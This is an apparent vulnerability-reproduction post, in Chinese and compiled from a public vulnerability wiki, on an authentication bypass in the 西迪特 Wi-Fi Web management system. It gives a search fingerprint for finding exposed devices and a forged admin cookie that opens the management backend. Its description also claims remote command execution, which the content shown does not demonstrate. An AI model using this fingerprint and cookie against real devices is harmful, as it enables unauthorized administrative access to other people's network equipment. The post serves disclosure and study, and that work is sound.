---
title: "西迪特 Wi-Fi Web管理 Cookie 越权访问漏洞"
date: 2026-10-18 09:16:50
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "西迪特"
tags:
  - "西迪特"
  - "命令执行"
  - "越权"
  - "漏洞复现"
---
## 漏洞描述

西迪特 Wi-Fi Web管理系统后台过滤不足导致远程命令执行漏洞

## 漏洞影响

```
西迪特 Wi-Fi Web管理
```

## 网络测绘

```
title=="Wi-Fi Web管理"
```

## 漏洞复现o

登录页面

![image-20220519183944313](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191839372.png)

添加Cookie，即可登录后台

```
Cookie: timestamp=0; cooLogin=1; cooUser=admin
```

![image-20220519184113756](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191841849.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E8%A5%BF%E8%BF%AA%E7%89%B9-Wi-Fi-Web%E7%AE%A1%E7%90%86-Cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md)
